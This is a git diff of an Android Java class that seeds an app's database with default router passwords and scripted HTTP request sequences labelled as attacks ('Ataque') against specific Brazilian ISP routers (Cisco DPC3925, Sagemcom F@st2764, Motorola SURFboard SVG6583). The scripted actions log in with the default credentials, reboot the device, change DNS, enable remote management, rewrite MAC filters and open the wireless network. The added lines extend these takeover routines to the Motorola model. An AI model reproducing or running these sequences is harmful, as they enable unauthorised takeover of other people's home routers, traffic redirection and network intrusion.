@@ -2,6 +2,7 @@ package br.pedrofreitas.myroutertestapp.dao;
 
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.os.PowerManager;
 import android.util.Log;
 import br.pedrofreitas.myroutertestapp.manager.Ataque;
 import br.pedrofreitas.myroutertestapp.manager.Login;
@@ -51,29 +52,34 @@ public class Initialize {
 		/******************************************************/
 	}
 
-	public void insertAll() {	
+	public void insertAll() {			
+		PowerManager powerManager = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
+    	PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "LOCK_TABLES");
+    	wakeLock.acquire();
+				
 		mLoginDao.insert(new Login(1, "super", "@c&essoO1", "oi"));
 		mLoginDao.insert(new Login(2, "admin", "admin", "oi"));
 		mLoginDao.insert(new Login(3, "", "", "net"));
 		mLoginDao.insert(new Login(4, "admin", "", "oi"));
 		mLoginDao.insert(new Login(5, "admin", "1234", "oi"));
 		mLoginDao.insert(new Login(6, "admin", "gvt12345", "gvt"));
-		mLoginDao.insert(new Login(7, "admin", "motorola", "net"));
-		mLoginDao.insert(new Login(8, "router", "router", "net"));
-		mLoginDao.insert(new Login(9, "cablecom", "", "net"));
-		mLoginDao.insert(new Login(10, "", "admin", "oi"));
-		mLoginDao.insert(new Login(11, "", "Wireless", "oi"));
-		mLoginDao.insert(new Login(12, "Admin", "Admin", "oi"));
-		mLoginDao.insert(new Login(13, "Admin", "", "oi"));
-		mLoginDao.insert(new Login(14, "", "Admin", "oi"));
-		mLoginDao.insert(new Login(15, "Administrator", "Administrator", "oi"));
-		mLoginDao.insert(new Login(16, "Administrator", "", "oi"));
-		mLoginDao.insert(new Login(17, "", "Administrator", "oi"));
-		mLoginDao.insert(new Login(18, "root", "root", "oi"));
-		mLoginDao.insert(new Login(19, "root", "", "oi"));
-		mLoginDao.insert(new Login(20, "", "root", "oi"));
-		mLoginDao.insert(new Login(21, "admin", "password", "net"));
-		mLoginDao.insert(new Login(22, "", "1234", "oi"));
+		mLoginDao.insert(new Login(7, "root", "motorola", "net"));	
+		mLoginDao.insert(new Login(8, "admin", "motorola", "net"));
+		mLoginDao.insert(new Login(9, "router", "router", "net"));
+		mLoginDao.insert(new Login(10, "cablecom", "", "net"));
+		mLoginDao.insert(new Login(11, "", "admin", "oi"));
+		mLoginDao.insert(new Login(12, "", "Wireless", "oi"));
+		mLoginDao.insert(new Login(13, "Admin", "Admin", "oi"));
+		mLoginDao.insert(new Login(14, "Admin", "", "oi"));
+		mLoginDao.insert(new Login(15, "", "Admin", "oi"));
+		mLoginDao.insert(new Login(16, "Administrator", "Administrator", "oi"));
+		mLoginDao.insert(new Login(17, "Administrator", "", "oi"));
+		mLoginDao.insert(new Login(18, "", "Administrator", "oi"));
+		mLoginDao.insert(new Login(19, "root", "root", "oi"));
+		mLoginDao.insert(new Login(20, "root", "", "oi"));
+		mLoginDao.insert(new Login(21, "", "root", "oi"));
+		mLoginDao.insert(new Login(22, "admin", "password", "net"));
+		mLoginDao.insert(new Login(23, "", "1234", "oi"));
 	
 		/*******************************************************Start Login*******************************************************/
 //		GVT D-Link DSL-2640B	
@@ -111,13 +117,13 @@ public class Initialize {
 		
 //		NET Cisco DPC3925
 		mAtaqueDao.insert(new Ataque(4, "login", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(20, 4, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(20, 4, 1, "post", "/goform/Docsis_system", "", 1));		//Setup //Management												
 				mParamsDao.insert(new Params(6, 20, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(7, 20, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(8, 20, "LanguageSelect", "en"));
 				mParamsDao.insert(new Params(9, 20, "Language_Submit", "0"));
 				mParamsDao.insert(new Params(10, 20, "login", "Log In"));
-			mPostGetDao.insert(new PostGet(21, 4, 2, "get", "/Quick_setup.asp", "Setup", 0));
+			mPostGetDao.insert(new PostGet(21, 4, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));		//
 	
 		/********************************************************End Login********************************************************/
 			
@@ -170,7 +176,7 @@ public class Initialize {
 	
 //		NET Cisco DPC3925
 		mAtaqueDao.insert(new Ataque(8, "reboot", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(51, 8, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(51, 8, 1, "post", "/goform/Docsis_system", "", 1));		//Setup														
 				mParamsDao.insert(new Params(18, 51, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(19, 51, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(20, 51, "LanguageSelect", "en"));
@@ -386,7 +392,7 @@ public class Initialize {
 
 //		NET Cisco DPC3925			
 		mAtaqueDao.insert(new Ataque(12, "dns", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(98, 12, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(98, 12, 1, "post", "/goform/Docsis_system", "", 1));		//Setup														
 				mParamsDao.insert(new Params(49, 98, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(50, 98, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(51, 98, "LanguageSelect", "en"));
@@ -532,7 +538,7 @@ public class Initialize {
 
 //		NET Cisco DPC3925		***DONT WORK***			
 		mAtaqueDao.insert(new Ataque(16, "acesso", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(143, 16, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(143, 16, 1, "post", "/goform/Docsis_system", "", 1));		//Setup														
 				mParamsDao.insert(new Params(114, 143, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(115, 143, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(116, 143, "LanguageSelect", "en"));
@@ -715,7 +721,7 @@ public class Initialize {
 		
 //		NET Cisco DPC3925		***DONT WORK***			
 		mAtaqueDao.insert(new Ataque(20, "filtromac", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(207, 20, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(207, 20, 1, "post", "/goform/Docsis_system", "", 1));		//Setup														
 				mParamsDao.insert(new Params(203, 207, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(204, 207, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(205, 207, "LanguageSelect", "en"));
@@ -913,7 +919,7 @@ public class Initialize {
 
 //		NET Cisco DPC3925		***DONT WORK***
 		mAtaqueDao.insert(new Ataque(24, "abrirrede", "net", 1, 0, null, 0, "Cisco DPC3925"));			
-			mPostGetDao.insert(new PostGet(246, 24, 1, "post", "/goform/Docsis_system", "Setup", 1));														
+			mPostGetDao.insert(new PostGet(246, 24, 1, "post", "/goform/Docsis_system", "", 1));		//Setup														
 				mParamsDao.insert(new Params(304, 246, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(305, 246, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(306, 246, "LanguageSelect", "en"));
@@ -1079,7 +1085,7 @@ public class Initialize {
 					mParamsProxDao.insert(new Params(117, 323, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(324, 30, 33, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//1603439650
 
-//		GVT Sagemcom PowerBox F@st2764		***DONT WORK***				
+//		GVT Sagemcom PowerBox F@st2764		***WORK BUT TIMEOUT***				
 		mAtaqueDao.insert(new Ataque(31, "filtromac", "gvt", 0, 1, "<input type=\"hidden\" name=\"sessionid\" value=\"TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc\" />", 0, "Sagemcom PowerBox F@st2764"));			
 			mPostGetDao.insert(new PostGet(325, 31, 1, "get", "", "", 1));	
 					mParamsProxDao.insert(new Params(118, 325, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
@@ -1182,11 +1188,177 @@ public class Initialize {
 				mParamsDao.insert(new Params(365, 370, "statuswmm", "1"));			
 				mParamsDao.insert(new Params(366, 370, "statusapsd", "1"));	
 			
-		/*******************************************************End Abrir Rede******************************************************/
+		/******************************************************End Abrir Rede*****************************************************/
 				
 				
-		Log.i("INSERT_TABLES", "Tabelas preenchidas com sucesso");
+		/*******************************************************Start Login*******************************************************/
+//		Motorola Surfboard SVG6583
+		mAtaqueDao.insert(new Ataque(34, "login", "net", 0, 0, null, 0, "Motorola SURFboard SVG6583"));			
+			mPostGetDao.insert(new PostGet(371, 34, 1, "post", "/goform/login", "Connection", 1));														
+				mParamsDao.insert(new Params(367, 371, "loginUsername", "insereUsuario"));
+				mParamsDao.insert(new Params(368, 371, "loginPassword", "insereSenha"));
+			mPostGetDao.insert(new PostGet(372, 34, 2, "get", "/RgConnect.asp", "Status - Connection", 0));
+			
+		/********************************************************End Login********************************************************/
 		
+		
+		/******************************************************Start Reboot*******************************************************/
+//		Motorola Surfboard SVG6583
+		mAtaqueDao.insert(new Ataque(35, "reboot", "net", 0, 0, null, 0, "Motorola SURFboard SVG6583"));			
+			mPostGetDao.insert(new PostGet(373, 35, 1, "post", "/goform/login", "Status - Connection", 1));														
+				mParamsDao.insert(new Params(369, 373, "loginUsername", "insereUsuario"));
+				mParamsDao.insert(new Params(370, 373, "loginPassword", "insereSenha"));
+			mPostGetDao.insert(new PostGet(374, 35, 2, "get", "/RgConnect.asp", "Status - Connection", 0));
+			mPostGetDao.insert(new PostGet(375, 35, 3, "get", "/RgConfiguration.asp", "Status - Security", 0));
+			mPostGetDao.insert(new PostGet(376, 35, 4, "post", "/goform/RgConfiguration", "The device has been reset", 0));
+				mParamsDao.insert(new Params(371, 376, "SaveChanges", "Reboot"));
+			mPostGetDao.insert(new PostGet(377, 35, 5, "get", "/login.asp", "", 0));
+		
+		/*******************************************************End Reboot********************************************************/	
+		
+		
+		/********************************************************Start DNS********************************************************/
+		
+		/*********************************************************End DNS*********************************************************/
+		
+		
+		/****************************************************Start Acesso Remoto**************************************************/
+//		Motorola Surfboard SVG6583
+		mAtaqueDao.insert(new Ataque(36, "acesso", "net", 0, 0, null, 0, "Motorola SURFboard SVG6583"));			
+			mPostGetDao.insert(new PostGet(378, 36, 1, "post", "/goform/login", "Status - Connection", 1));														
+				mParamsDao.insert(new Params(372, 378, "loginUsername", "insereUsuario"));
+				mParamsDao.insert(new Params(373, 378, "loginPassword", "insereSenha"));
+			mPostGetDao.insert(new PostGet(379, 36, 2, "get", "/RgConnect.asp", "Status - Connection", 0));
+			mPostGetDao.insert(new PostGet(380, 36, 3, "get", "/RgOptions.asp", "Advanced - Options", 0));
+					mParamsProxDao.insert(new Params(136, 380, "cbWanBlocking", "<input type=\"CheckBox\" name=\"cbWanBlocking\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(137, 380, "cbIpsecPassThrough", "<input type=\"CheckBox\" name=\"cbIpsecPassThrough\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(138, 380, "cbPptpPassThrough", "<input type=\"CheckBox\" name=\"cbPptpPassThrough\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(139, 380, "cbOptMulticast", "<input type=\"CheckBox\" name=\"cbOptMulticast\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(140, 380, "FTP", "<input type=\"CheckBox\" name=\"FTP\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(141, 380, "TFTP", "<input type=\"CheckBox\" name=\"TFTP\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(142, 380, "Kerb88", "<input type=\"CheckBox\" name=\"Kerb88\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(143, 380, "Kerb1293", "<input type=\"CheckBox\" name=\"Kerb1293\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(144, 380, "ICQ", "<input type=\"CheckBox\" name=\"ICQ\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(145, 380, "ICQTalk", "<input type=\"CheckBox\" name=\"ICQTalk\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(146, 380, "IRC666x", "<input type=\"CheckBox\" name=\"IRC666x\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(147, 380, "IRC7000", "<input type=\"CheckBox\" name=\"IRC7000\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(148, 380, "IRC8000", "<input type=\"CheckBox\" name=\"IRC8000\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(149, 380, "H225", "<input type=\"CheckBox\" name=\"H225\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(150, 380, "RSVP", "<input type=\"CheckBox\" name=\"RSVP\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(151, 380, "NetBios", "<input type=\"CheckBox\" name=\"NetBios\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(152, 380, "MSN", "<input type=\"CheckBox\" name=\"MSN\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(153, 380, "PPTP", "<input type=\"CheckBox\" name=\"PPTP\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(154, 380, "Net2Phone", "<input type=\"CheckBox\" name=\"Net2Phone\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(155, 380, "RTSP", "<input type=\"CheckBox\" name=\"RTSP\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(156, 380, "IKE", "<input type=\"CheckBox\" name=\"IKE\" value=\"(.*?)\""));		
+					mParamsProxDao.insert(new Params(157, 380, "SIP", "<input type=\"CheckBox\" name=\"SIP\" value=\"(.*?)\""));		
+			mPostGetDao.insert(new PostGet(381, 36, 4, "post", "/goform/RgOptions", "Advanced - Options", 0));													
+				mParamsDao.insert(new Params(374, 381, "cbWanBlocking", "inserecbWanBlocking"));		//0x10
+				mParamsDao.insert(new Params(375, 381, "cbIpsecPassThrough", "inserecbIpsecPassThrough"));		//0x20
+				mParamsDao.insert(new Params(376, 381, "cbPptpPassThrough", "inserecbPptpPassThrough"));		//0x40
+				mParamsDao.insert(new Params(377, 381, "cbRemoteManagement", "0x80"));
+				mParamsDao.insert(new Params(378, 381, "cbOptMulticast", "inserecbOptMulticast"));	//0x20000
+				mParamsDao.insert(new Params(379, 381, "FTP", "insereFTP"));		//0x1
+				mParamsDao.insert(new Params(380, 381, "TFTP", "insereTFTP"));		//0x2
+				mParamsDao.insert(new Params(381, 381, "Kerb88", "insereKerb88"));		//0x4
+				mParamsDao.insert(new Params(382, 381, "Kerb1293", "insereKerb1293"));		//0x8
+				mParamsDao.insert(new Params(383, 381, "ICQ", "insereICQ"));		//0x10
+				mParamsDao.insert(new Params(384, 381, "ICQTalk", "insereICQTalk"));		//0x20
+				mParamsDao.insert(new Params(385, 381, "IRC666x", "insereIRC666x"));		//0x40
+				mParamsDao.insert(new Params(386, 381, "IRC7000", "insereIRC7000"));		//0x80
+				mParamsDao.insert(new Params(387, 381, "IRC8000", "insereIRC8000"));		//0x100
+				mParamsDao.insert(new Params(388, 381, "H225", "insereH225"));		//0x200
+				mParamsDao.insert(new Params(389, 381, "RSVP", "insereRSVP"));		//0x400
+				mParamsDao.insert(new Params(390, 381, "NetBios", "insereNetBios"));		//0x800
+				mParamsDao.insert(new Params(391, 381, "MSN", "insereMSN"));		//0x1000
+				mParamsDao.insert(new Params(392, 381, "PPTP", "inserePPTP"));		//0x2000
+				mParamsDao.insert(new Params(393, 381, "Net2Phone", "insereNet2Phone"));		//0x4000
+				mParamsDao.insert(new Params(394, 381, "RTSP", "insereRTSP"));		//0x8000
+				mParamsDao.insert(new Params(395, 381, "IKE", "insereIKE"));		//0x10000
+				mParamsDao.insert(new Params(396, 381, "SIP", "insereSIP"));		//0x20000
+				mParamsDao.insert(new Params(397, 381, "ApplyRgOpAction", "1"));
+				mParamsDao.insert(new Params(398, 381, "NewMacAddress", ""));
+				mParamsDao.insert(new Params(399, 381, "MacAddressAction", "0"));			
+			mPostGetDao.insert(new PostGet(382, 36, 5, "get", "/login.asp", "Login", 0));
+			mPostGetDao.insert(new PostGet(383, 36, 6, "get", "/RgSwInfo.asp", "Status - Software", 0));
+			mPostGetDao.insert(new PostGet(384, 36, 7, "get", "/RgConfiguration.asp", "Status - Security", 0));
+			mPostGetDao.insert(new PostGet(385, 36, 8, "post", "/goform/RgConfiguration", "The device has been reset", 0));
+				mParamsDao.insert(new Params(400, 385, "SaveChanges", "Reboot"));
+			mPostGetDao.insert(new PostGet(386, 36, 9, "get", "/login.asp", "", 0));	
+					
+		/*****************************************************End Acesso Remoto***************************************************/
+		
+		
+		/*****************************************************Start Filtro MAC****************************************************/
+//		Motorola Surfboard SVG6583
+		mAtaqueDao.insert(new Ataque(37, "filtromac", "net", 0, 0, null, 0, "Motorola SURFboard SVG6583"));			
+			mPostGetDao.insert(new PostGet(387, 37, 1, "post", "/goform/login", "Status - Connection", 1));														
+				mParamsDao.insert(new Params(401, 387, "loginUsername", "insereUsuario"));
+				mParamsDao.insert(new Params(402, 387, "loginPassword", "insereSenha"));
+			mPostGetDao.insert(new PostGet(388, 37, 2, "get", "/RgConnect.asp", "Status - Connection", 0));
+			mPostGetDao.insert(new PostGet(389, 37, 3, "get", "/wlanRadio.asp", "Wireless - Radio Configuration", 0));
+			mPostGetDao.insert(new PostGet(390, 37, 4, "get", "/wlanAccess.asp", "Wireless - Access Control", 0));
+					mParamsProxDao.insert(new Params(158, 390, "wlanAccessMbssIndexChanged", "<input type=\"hidden\" name=\"wlanAccessMbssIndexChanged\"value=(.*?) >"));			
+			mPostGetDao.insert(new PostGet(391, 37, 5, "post", "/goform/wlanAccess", "", 0));
+				mParamsDao.insert(new Params(403, 391, "wlanAccessMbssIndexChanged", "inserewlanAccessMbssIndexChanged"));		//0
+				mParamsDao.insert(new Params(404, 391, "wlanAccessCurrentNetworks", "0"));		//Kenner
+				mParamsDao.insert(new Params(405, 391, "MacRestrictMode", "1"));		//Allow
+				mParamsDao.insert(new Params(406, 391, "WirelessMac01", "90:00:4E:AC:F6:B5"));
+				mParamsDao.insert(new Params(407, 391, "WirelessMac09", ""));
+				mParamsDao.insert(new Params(408, 391, "WirelessMac02", "insereMAC"));		//34:BB:26:60:62:0D
+				mParamsDao.insert(new Params(409, 391, "WirelessMac10", ""));
+				mParamsDao.insert(new Params(410, 391, "WirelessMac03", ""));
+				mParamsDao.insert(new Params(411, 391, "WirelessMac11", ""));
+				mParamsDao.insert(new Params(412, 391, "WirelessMac04", ""));
+				mParamsDao.insert(new Params(413, 391, "WirelessMac12", ""));
+				mParamsDao.insert(new Params(414, 391, "WirelessMac05", ""));
+				mParamsDao.insert(new Params(415, 391, "WirelessMac13", ""));
+				mParamsDao.insert(new Params(416, 391, "WirelessMac06", ""));
+				mParamsDao.insert(new Params(417, 391, "WirelessMac14", ""));
+				mParamsDao.insert(new Params(418, 391, "WirelessMac07", ""));
+				mParamsDao.insert(new Params(419, 391, "WirelessMac15", ""));
+				mParamsDao.insert(new Params(420, 391, "WirelessMac08", ""));
+				mParamsDao.insert(new Params(421, 391, "WirelessMac16", ""));
+				mParamsDao.insert(new Params(422, 391, "commitwlanAccess", "0"));
+			mPostGetDao.insert(new PostGet(392, 37, 6, "get", "/wlanAccess.asp", "", 0));	
+					mParamsProxDao.insert(new Params(159, 392, "wlanAccessMbssIndexChanged", "<input type=\"hidden\" name=\"wlanAccessMbssIndexChanged\"value=(.*?) >"));		
+			mPostGetDao.insert(new PostGet(393, 37, 7, "post", "/goform/wlanAccess", "", 0));		//TIMEOUT
+				mParamsDao.insert(new Params(423, 393, "wlanAccessMbssIndexChanged", "inserewlanAccessMbssIndexChanged"));		//0
+				mParamsDao.insert(new Params(424, 393, "wlanAccessCurrentNetworks", "0"));		//Kenner
+				mParamsDao.insert(new Params(425, 393, "MacRestrictMode", "1"));		//Allow
+				mParamsDao.insert(new Params(426, 393, "WirelessMac01", "90:00:4E:AC:F6:B5"));
+				mParamsDao.insert(new Params(427, 393, "WirelessMac09", ""));
+				mParamsDao.insert(new Params(428, 393, "WirelessMac02", "insereMAC"));		//34:BB:26:60:62:0D
+				mParamsDao.insert(new Params(429, 393, "WirelessMac10", ""));
+				mParamsDao.insert(new Params(430, 393, "WirelessMac03", ""));
+				mParamsDao.insert(new Params(431, 393, "WirelessMac11", ""));
+				mParamsDao.insert(new Params(432, 393, "WirelessMac04", ""));
+				mParamsDao.insert(new Params(433, 393, "WirelessMac12", ""));
+				mParamsDao.insert(new Params(434, 393, "WirelessMac05", ""));
+				mParamsDao.insert(new Params(435, 393, "WirelessMac13", ""));
+				mParamsDao.insert(new Params(436, 393, "WirelessMac06", ""));
+				mParamsDao.insert(new Params(437, 393, "WirelessMac14", ""));
+				mParamsDao.insert(new Params(438, 393, "WirelessMac07", ""));
+				mParamsDao.insert(new Params(439, 393, "WirelessMac15", ""));
+				mParamsDao.insert(new Params(440, 393, "WirelessMac08", ""));
+				mParamsDao.insert(new Params(441, 393, "WirelessMac16", ""));
+				mParamsDao.insert(new Params(442, 393, "commitwlanAccess", "1"));		
+			mPostGetDao.insert(new PostGet(394, 37, 8, "get", "/RgSwInfo.asp", "", 0));		
+			mPostGetDao.insert(new PostGet(395, 37, 9, "get", "/RgConfiguration.asp", "Status - Security", 0));
+			mPostGetDao.insert(new PostGet(396, 37, 10, "post", "/goform/RgConfiguration", "The device has been reset", 0));
+				mParamsDao.insert(new Params(443, 396, "SaveChanges", "Reboot"));
+			mPostGetDao.insert(new PostGet(397, 37, 11, "get", "/login.asp", "", 0));
+		
+		/******************************************************End Filtro MAC*****************************************************/
+		
+		
+		/******************************************************Start Abrir Rede*****************************************************/
+		
+		/*******************************************************End Abrir Rede******************************************************/		
+			
+		wakeLock.release();  	
+			
+		Log.i("INSERT_TABLES", "Tabelas preenchidas com sucesso");		
 	}
 	
 	public void selectAll() {
